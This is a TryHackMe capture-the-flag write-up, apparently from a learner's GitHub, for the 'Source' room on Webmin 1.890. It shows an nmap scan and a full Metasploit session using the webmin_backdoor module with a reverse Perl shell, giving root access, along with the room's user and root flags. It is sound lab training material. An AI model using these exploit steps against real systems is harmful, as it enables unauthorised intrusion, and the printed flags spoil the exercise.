
<p align="center">April 7, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{336}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
  <img width="160px" src="https://github.com/user-attachments/assets/2618b170-66fb-4cd0-8989-4baf6071e985"></p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Source}}$$</h1>


<p align="center">Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. It is classified as an easy-level challenge, and you can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed. Click <a href="https://tryhackme.com/room/source">Source</a>.</p>

<p align="center"> <img width="900px" src="https://github.com/user-attachments/assets/fc1265c6-2733-4273-9cb7-bb0dfddf3ffd"> </p>

<br>
<br>


<h2 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h2>


<p align="center">There are have 2 ports open: <code>ssh/22</code> and <code>webmin/10000</code>. </p>

```bash
~/Source# nmap -sC -sV -sS -Pn -p- -A TargetIP
...
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
...
```

<h2 align="center">$$\textcolor{white}{\textnormal{Navigated to http://TargetIP:10000}}$$</h2>


![image](https://github.com/user-attachments/assets/d2987222-9565-4ac2-bbff-c715424d452a)

<h2 align="center">$$\textcolor{white}{\textnormal{Added domain name and Target IP to /etc/hosts}}$$</h2>

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{Checked the CA: root@source}}$$</h2>

![image](https://github.com/user-attachments/assets/27ee5f74-ab8a-40a3-bdec-47a66cba6603)

<br>


<h2 align="center">$$\textcolor{white}{\textnormal{Used Metasploit framwork}}$$</h2>

```bash
msf6 > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf6 >  use 10
...
msf6 exploit(linux/http/webmin_backdoor) > show options
...
sf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.10.15.153
LHOST => 10.10.15.153
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.161.107
RHOSTS => 10.10.161.107
msf6 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_backdoor) > set RPORT 10000
RPORT => 10000
msf5 exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 10.10.15.153:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.15.153:4444 -> 10.10.161.107:42594) at 2025-04-07 22:54:16 +0100

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/usr/share/webmin
python -c "import pty;pty.spawn('/bin/bash')"
root@source:/usr/share/webmin/#

...


root@source:/home/dark# cat user.txt
cat user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
root@source:/home/dark# 

...
root@source:~# ls -la
ls -la
total 36
drwx------  5 root root 4096 Jun 26  2020 .
drwxr-xr-x 24 root root 4096 Jun 26  2020 ..
-rw-------  1 root root   44 Jun 26  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Jun 26  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 26  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jun 26  2020 .ssh
-rw-r--r--  1 root root   25 Jun 26  2020 root.txt
root@source:~# cat root.txt
cat root.txt
THM{UPDATE_YOUR_INSTALL}
root@source:~# 


```


<br>
<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$
<br><img width="900px" src="https://github.com/user-attachments/assets/d1fcd1ae-ea57-41d7-8664-a5c7fb7ec8bf">
<br><img width="900px" src="https://github.com/user-attachments/assets/46435ef8-7db8-4a44-9d8b-45fa1ac7de2d"></h1>

<br>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>


<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |Global        | Brazil       | Global      | Brazil     |          | Completed |           |
| April 7, 2025     | 336      |     304ᵗʰ    |        8ᵗʰ   |    317ᵗʰ    |     4ᵗʰ    |  91,786  |       648 |   59      |

</div>

<p align="center"> Global All Time: 304ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/521b5e26-261a-49e6-bd10-3e4c82caa2b9"> </p>

<p align="center"> Brazil All Time: 8ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/f2bddc1e-7c5d-4d8d-9153-4df207e25a09"> </p>

<p align="center"> Global monthly: 317ᵗʰ<br><br><img width="900px" src="https://github.com/user-attachments/assets/920d0340-25e7-448a-9cca-225516274788"> </p>

<p align="center"> Brazil monthly: 4ᵗʰ<br><br><img width="900px" src=https://github.com/user-attachments/assets/c1f8f43d-f0c0-4e51-85e7-960209177240"> </p>

